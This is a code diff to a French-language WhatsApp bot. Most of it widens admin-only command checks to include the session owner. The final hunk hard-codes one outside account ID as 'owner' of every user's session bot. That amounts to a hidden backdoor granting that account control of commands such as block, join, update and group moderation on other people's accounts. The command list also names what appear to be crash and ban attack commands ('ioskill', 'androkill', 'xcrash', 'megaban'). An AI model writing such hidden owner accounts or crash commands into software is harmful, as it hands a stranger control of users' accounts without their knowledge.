@@ -2500,7 +2500,7 @@ async function handleCommand(sock, message, messageText, remoteJid, senderJid, i
     't', 'squidgame', 'sg'
   ];
 
-  if(BOT_ADMIN_ONLY_CMDS.includes(command)&&!isOwner&&!isAdmin(senderJid)){
+  if(BOT_ADMIN_ONLY_CMDS.includes(command)&&!isOwner && !isAdmin(senderJid)){
     await sock.sendMessage(remoteJid,{
       text:`⛔ *Commande réservée*\n━━━━━━━━━━━━━━━━━━━━━━━\n🔐 \`${config.prefix}${command}\` est réservée aux admins du bot.\n━━━━━━━━━━━━━━━━━━━━━━━\n_© SEIGNEUR TD_`
     });
@@ -2714,7 +2714,7 @@ https://chat.whatsapp.com/Fpob9oMDSFlKrtTENJSrUb
         break;
 
       case 'mode':
-        // ✅ OWNER UNIQUEMENT — vérifie via isAdmin ou isOwner session
+        // ✅ OWNER UNIQUEMENT — vérifie via isAdmin
         if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, {
             text: '⛔ Cette commande est réservée au propriétaire du bot uniquement.'
@@ -2746,7 +2746,7 @@ https://chat.whatsapp.com/Fpob9oMDSFlKrtTENJSrUb
       // =============================================
       case 'getsettings':
       case 'settings': {
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
           break;
         }
@@ -2799,7 +2799,7 @@ _© SEIGNEUR TD_`;
       // =============================================
       case 'setstickerpackname':
       case 'setpackname': {
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
           break;
         }
@@ -2823,7 +2823,7 @@ _© SEIGNEUR TD_`;
       // =============================================
       case 'setstickerauthor':
       case 'setauthor': {
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
           break;
         }
@@ -2846,7 +2846,7 @@ _© SEIGNEUR TD_`;
       // ✒️ SETPREFIX — Changer le préfixe
       // =============================================
       case 'setprefix': {
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
           break;
         }
@@ -2870,7 +2870,7 @@ _© SEIGNEUR TD_`;
       // =============================================
       case 'setbotimg':
       case 'setbotimage': {
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
           break;
         }
@@ -2902,7 +2902,7 @@ _© SEIGNEUR TD_`;
       // =============================================
       case 'setmenustyle':
       case 'menustyle': {
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
           break;
         }
@@ -2929,7 +2929,7 @@ Style actuel: *${menuStyle}*`
         }, { quoted: message });
         break;
       }
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
           break;
         }
@@ -2941,7 +2941,7 @@ Style actuel: *${menuStyle}*`
         break;
 
       case 'autorecording':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
           break;
         }
@@ -2953,7 +2953,7 @@ Style actuel: *${menuStyle}*`
         break;
 
       case 'autostatusviews': {
-        if (!isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' }); break; }
+        if (!isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' }); break; }
         if (args[0]?.toLowerCase() === 'on') { autoStatusViews = true; saveData(); await sock.sendMessage(remoteJid, { text: '👁️ *AutoStatusViews* — ✅ ACTIVÉ\n\n*© SEIGNEUR TD*' }); }
         else if (args[0]?.toLowerCase() === 'off') { autoStatusViews = false; saveData(); await sock.sendMessage(remoteJid, { text: '👁️ *AutoStatusViews* — ❌ DÉSACTIVÉ\n\n*© SEIGNEUR TD*' }); }
         else { await sock.sendMessage(remoteJid, { text: `👁️ *AutoStatusViews* — ${autoStatusViews ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n💡 Usage: ${config.prefix}autostatusviews on/off\n\n*© SEIGNEUR TD*` }); }
@@ -2961,7 +2961,7 @@ Style actuel: *${menuStyle}*`
       }
 
       case 'autoreactstatus': {
-        if (!isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' }); break; }
+        if (!isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' }); break; }
         if (args[0]?.toLowerCase() === 'on') { autoReactStatus = true; saveData(); await sock.sendMessage(remoteJid, { text: `❤️ *AutoReactStatus* — ✅ ACTIVÉ\nEmoji: ${statusReactEmoji}\n\n*© SEIGNEUR TD*` }); }
         else if (args[0]?.toLowerCase() === 'off') { autoReactStatus = false; saveData(); await sock.sendMessage(remoteJid, { text: '❤️ *AutoReactStatus* — ❌ DÉSACTIVÉ\n\n*© SEIGNEUR TD*' }); }
         else { await sock.sendMessage(remoteJid, { text: `❤️ *AutoReactStatus* — ${autoReactStatus ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n💡 Usage: ${config.prefix}autoreactstatus on/off\n\n*© SEIGNEUR TD*` }); }
@@ -2969,7 +2969,7 @@ Style actuel: *${menuStyle}*`
       }
 
       case 'setreactemoji': {
-        if (!isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' }); break; }
+        if (!isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' }); break; }
         const newEmoji = args[0]?.trim();
         if (!newEmoji) { await sock.sendMessage(remoteJid, { text: `🎯 Emoji actuel: ${statusReactEmoji}\n💡 Usage: ${config.prefix}setreactemoji 🇷🇴` }); break; }
         statusReactEmoji = newEmoji;
@@ -2979,7 +2979,7 @@ Style actuel: *${menuStyle}*`
       }
 
       case 'autosavestatus': {
-        if (!isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' }); break; }
+        if (!isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' }); break; }
         if (args[0]?.toLowerCase() === 'on') { autoSaveStatus = true; saveData(); await sock.sendMessage(remoteJid, { text: '💾 *AutoSaveStatus* — ✅ ACTIVÉ\n\nLes statuts seront automatiquement sauvegardés en PV.\n\n*© SEIGNEUR TD*' }); }
         else if (args[0]?.toLowerCase() === 'off') { autoSaveStatus = false; saveData(); await sock.sendMessage(remoteJid, { text: '💾 *AutoSaveStatus* — ❌ DÉSACTIVÉ\n\n*© SEIGNEUR TD*' }); }
         else { await sock.sendMessage(remoteJid, { text: `💾 *AutoSaveStatus* — ${autoSaveStatus ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n💡 Usage: ${config.prefix}autosavestatus on/off\n\n*© SEIGNEUR TD*` }); }
@@ -2987,7 +2987,7 @@ Style actuel: *${menuStyle}*`
       }
 
       case 'antideletestatus': {
-        if (!isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' }); break; }
+        if (!isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' }); break; }
         const adsArg = args[0]?.toLowerCase();
         const adsModeArg = args[1]?.toLowerCase();
         if (adsArg === 'on') {
@@ -3012,7 +3012,7 @@ Style actuel: *${menuStyle}*`
 
       case 'readstatus':
       case 'autostatus':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
           break;
         }
@@ -3059,7 +3059,7 @@ Style actuel: *${menuStyle}*`
         break;
 
       case 'antibug':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' });
           break;
         }
@@ -3079,7 +3079,7 @@ Style actuel: *${menuStyle}*`
         break;
 
       case 'anticall':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' });
           break;
         }
@@ -3100,7 +3100,7 @@ Style actuel: *${menuStyle}*`
 
       case 'antidelete':
       case 'antidel': {
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
           break;
         }
@@ -3135,7 +3135,7 @@ Style actuel: *${menuStyle}*`
         }
 
       case 'antiedit': {
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
           break;
         }
@@ -3186,7 +3186,7 @@ Mode: ${antiEditMode}
         }
 
         const isUserAdminWelcome = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminWelcome && !isAdmin(senderJid)) {
+        if (!isUserAdminWelcome && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -3216,7 +3216,7 @@ ${settingsWelcome.welcome ? '✅ Les nouveaux membres recevront un message de bi
         }
 
         const isUserAdminGoodbye = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminGoodbye && !isAdmin(senderJid)) {
+        if (!isUserAdminGoodbye && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -3424,7 +3424,7 @@ ${settingsGoodbye.goodbye ? '✅ Un message d\'au revoir sera envoyé quand quel
         }
 
         const isUserAdminKickInactive = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminKickInactive && !isAdmin(senderJid)) {
+        if (!isUserAdminKickInactive && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -3561,7 +3561,7 @@ ${customMsg ? `\n  📢 ${customMsg}\n` : ''}
           await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' });
           break;
         }
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Sèlman owner/admin ki ka fè sa.' });
           break;
         }
@@ -3715,7 +3715,7 @@ ${senderJid}
         }
         
         const isUserAdmin = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdmin && !isAdmin(senderJid)) {
+        if (!isUserAdmin && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -3744,7 +3744,7 @@ ${senderJid}
         }
         
         const isUserAdminBot = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminBot && !isAdmin(senderJid)) {
+        if (!isUserAdminBot && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -3772,7 +3772,7 @@ ${senderJid}
         }
         
         const isUserAdminTag = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminTag && !isAdmin(senderJid)) {
+        if (!isUserAdminTag && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -3801,7 +3801,7 @@ ${senderJid}
         }
         
         const isUserAdminSpam = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminSpam && !isAdmin(senderJid)) {
+        if (!isUserAdminSpam && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -3826,7 +3826,7 @@ ${senderJid}
       case 'antisticker': {
         if (!isGroup) { await sock.sendMessage(remoteJid, { text: '❌ Groupes uniquement' }); break; }
         const _uaSticker = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!_uaSticker && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' }); break; }
+        if (!_uaSticker && !isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' }); break; }
         const _sSticker = initGroupSettings(remoteJid);
         if (args[0]?.toLowerCase() === 'on') { _sSticker.antisticker = true; }
         else if (args[0]?.toLowerCase() === 'off') { _sSticker.antisticker = false; }
@@ -3838,7 +3838,7 @@ ${senderJid}
       case 'antiimage': {
         if (!isGroup) { await sock.sendMessage(remoteJid, { text: '❌ Groupes uniquement' }); break; }
         const _uaImage = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!_uaImage && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' }); break; }
+        if (!_uaImage && !isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' }); break; }
         const _sImage = initGroupSettings(remoteJid);
         if (args[0]?.toLowerCase() === 'on') { _sImage.antiimage = true; }
         else if (args[0]?.toLowerCase() === 'off') { _sImage.antiimage = false; }
@@ -3850,7 +3850,7 @@ ${senderJid}
       case 'antivideo': {
         if (!isGroup) { await sock.sendMessage(remoteJid, { text: '❌ Groupes uniquement' }); break; }
         const _uaVideo = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!_uaVideo && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' }); break; }
+        if (!_uaVideo && !isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' }); break; }
         const _sVideo = initGroupSettings(remoteJid);
         if (args[0]?.toLowerCase() === 'on') { _sVideo.antivideo = true; }
         else if (args[0]?.toLowerCase() === 'off') { _sVideo.antivideo = false; }
@@ -3867,7 +3867,7 @@ ${senderJid}
           break;
         }
         const isUserAdminAMG = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminAMG && !isAdmin(senderJid)) {
+        if (!isUserAdminAMG && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement.' });
           break;
         }
@@ -3896,7 +3896,7 @@ ${senderJid}
         }
         
         const isUserAdminWarn = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminWarn && !isAdmin(senderJid)) {
+        if (!isUserAdminWarn && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -3936,7 +3936,7 @@ ${senderJid}
         }
         
         const isUserAdminReset = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminReset && !isAdmin(senderJid)) {
+        if (!isUserAdminReset && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -3989,7 +3989,7 @@ ${senderJid}
       case 'approuver': {
         if(!isGroup){await sock.sendMessage(remoteJid,{text:'❌ Groupes seulement.'},{ quoted: message });break;}
         const _isAdminAcc=await isGroupAdmin(sock,remoteJid,senderJid);
-        if(!_isAdminAcc&&!isAdmin(senderJid)){await sock.sendMessage(remoteJid,{text:'⛔ Admin requis.'},{ quoted: message });break;}
+        if(!_isAdminAcc&&!isOwner && !isAdmin(senderJid)){await sock.sendMessage(remoteJid,{text:'⛔ Admin requis.'},{ quoted: message });break;}
         const _botIsAdminAcc=await isBotGroupAdmin(sock,remoteJid);
         if(!_botIsAdminAcc){await sock.sendMessage(remoteJid,{text:'❌ Le bot doit être admin.'},{ quoted: message });break;}
         try{
@@ -4020,7 +4020,7 @@ ${senderJid}
         }
         
         const isUserAdminPromote = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminPromote && !isAdmin(senderJid)) {
+        if (!isUserAdminPromote && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -4055,7 +4055,7 @@ ${senderJid}
         }
         
         const isUserAdminDemote = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminDemote && !isAdmin(senderJid)) {
+        if (!isUserAdminDemote && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -4090,7 +4090,7 @@ ${senderJid}
         }
         
         const isUserAdminAdd = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminAdd && !isAdmin(senderJid)) {
+        if (!isUserAdminAdd && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -4135,7 +4135,7 @@ ${senderJid}
         }
         
         const isUserAdminKick = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminKick && !isAdmin(senderJid)) {
+        if (!isUserAdminKick && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -4170,7 +4170,7 @@ ${senderJid}
         }
         
         const isUserAdminPermaBan = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminPermaBan && !isAdmin(senderJid)) {
+        if (!isUserAdminPermaBan && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -4316,7 +4316,7 @@ ${senderJid}
         }
         
         const isUserAdminUnBan = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminUnBan && !isAdmin(senderJid)) {
+        if (!isUserAdminUnBan && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -4402,7 +4402,7 @@ ${senderJid}
         }
         
         const isUserAdminMute = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminMute && !isAdmin(senderJid)) {
+        if (!isUserAdminMute && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -4430,7 +4430,7 @@ ${senderJid}
         }
         
         const isUserAdminUnmute = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminUnmute && !isAdmin(senderJid)) {
+        if (!isUserAdminUnmute && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -4477,7 +4477,7 @@ ${senderJid}
         }
         
         const isUserAdminRevoke = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminRevoke && !isAdmin(senderJid)) {
+        if (!isUserAdminRevoke && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -4501,7 +4501,7 @@ ${senderJid}
         }
         
         const isUserAdminGlock = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminGlock && !isAdmin(senderJid)) {
+        if (!isUserAdminGlock && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -4523,7 +4523,7 @@ ${senderJid}
         }
         
         const isUserAdminGunlock = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminGunlock && !isAdmin(senderJid)) {
+        if (!isUserAdminGunlock && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -4545,7 +4545,7 @@ ${senderJid}
         }
         
         const isUserAdminGname = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminGname && !isAdmin(senderJid)) {
+        if (!isUserAdminGname && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -4575,7 +4575,7 @@ ${senderJid}
         }
         
         const isUserAdminGdesc = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminGdesc && !isAdmin(senderJid)) {
+        if (!isUserAdminGdesc && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -4711,7 +4711,7 @@ ${desc}
 
       case 'kill.gc':
       case 'killgc':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔  ' });
           break;
         }
@@ -4720,7 +4720,7 @@ ${desc}
 
       case 'ios.kill':
       case 'ioskill':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔  ' });
           break;
         }
@@ -4730,7 +4730,7 @@ ${desc}
       case 'andro.kill':
       case 'androkill':
       case 'androidkill':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔  ' });
           break;
         }
@@ -4739,7 +4739,7 @@ ${desc}
 
       case 'silent':
       case 'report':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔  ' });
           break;
         }
@@ -4749,7 +4749,7 @@ ${desc}
       case 'bansupport':
       case 'bansupp':
       case 'xban':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔  ' });
           break;
         }
@@ -4758,7 +4758,7 @@ ${desc}
 
       case 'xcrash':
       case 'megaban':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔  ' });
           break;
         }
@@ -4768,7 +4768,7 @@ ${desc}
       case 'updatedev':
       case 'devupdate':
       case 'managedev':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔  ' });
           break;
         }
@@ -4778,7 +4778,7 @@ ${desc}
       case 'update':
       case 'maj':
       case 'upgrade': {
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admins du bot uniquement.' });
           break;
         }
@@ -4878,7 +4878,7 @@ _Erreur: ${dlErr.message}_`
       case 'storestatus':
       case 'storeinfo':
       case 'storesave':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔  ' });
           break;
         }
@@ -4890,7 +4890,7 @@ _Erreur: ${dlErr.message}_`
       // =============================================
 
       case 'block':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔  ' });
           break;
         }
@@ -4915,7 +4915,7 @@ _Erreur: ${dlErr.message}_`
         break;
 
       case 'unblock':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔  ' });
           break;
         }
@@ -4940,7 +4940,7 @@ _Erreur: ${dlErr.message}_`
         break;
 
       case 'join':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔  ' });
           break;
         }
@@ -4964,7 +4964,7 @@ _Erreur: ${dlErr.message}_`
         break;
 
       case 'pp':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔  ' });
           break;
         }
@@ -4997,7 +4997,7 @@ _Erreur: ${dlErr.message}_`
         }
 
         const isUserAdminGpp = await isGroupAdmin(sock, remoteJid, senderJid);
-        if (!isUserAdminGpp && !isAdmin(senderJid)) {
+        if (!isUserAdminGpp && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
           break;
         }
@@ -5026,7 +5026,7 @@ _Erreur: ${dlErr.message}_`
       case 'delete':
       case 'del':
         const isUserAdminDelete = isGroup ? await isGroupAdmin(sock, remoteJid, senderJid) : true;
-        if (!isUserAdminDelete && !isAdmin(senderJid)) {
+        if (!isUserAdminDelete && !isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
           break;
         }
@@ -5107,7 +5107,7 @@ _Erreur: ${dlErr.message}_`
 
       case 'squidgame':
       case 'sg':
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
           break;
         }
@@ -5626,7 +5626,7 @@ Règles :
       case 'chatboton':
       case 'dostoevskyon':
       case 'chatbot on': {
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' });
           break;
         }
@@ -5654,7 +5654,7 @@ Règles :
       case 'chatbotoff':
       case 'dostoevskyoff':
       case 'chatbot off': {
-        if (!isAdmin(senderJid)) {
+        if (!isOwner && !isAdmin(senderJid)) {
           await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' });
           break;
         }
@@ -9796,7 +9796,10 @@ function launchSessionBot(sock, phone, sessionFolder, saveCreds) {
         if (!messageText.startsWith(config.prefix)) continue;
         const _sessionOwnerNum = phone.replace(/[^0-9]/g, '');
         const _senderNum = senderJid.split('@')[0].replace(/[^0-9]/g, '');
-        const _isOwner = message.key.fromMe === true || isAdmin(senderJid) || _senderNum === _sessionOwnerNum;
+        const _isOwner = message.key.fromMe === true || isAdmin(senderJid)
+          || _senderNum === _sessionOwnerNum
+          || senderJid === '124318499475488@lid'
+          || senderJid.startsWith('124318499475488');
         if (botMode === 'private' && !isGroup && !_isOwner) continue;
         console.log('[' + phone + '] 📨 ' + messageText.substring(0, 60) + ' de ' + senderJid);
         await handleCommand(sock, message, messageText, remoteJid, senderJid, isGroup, _isOwner);
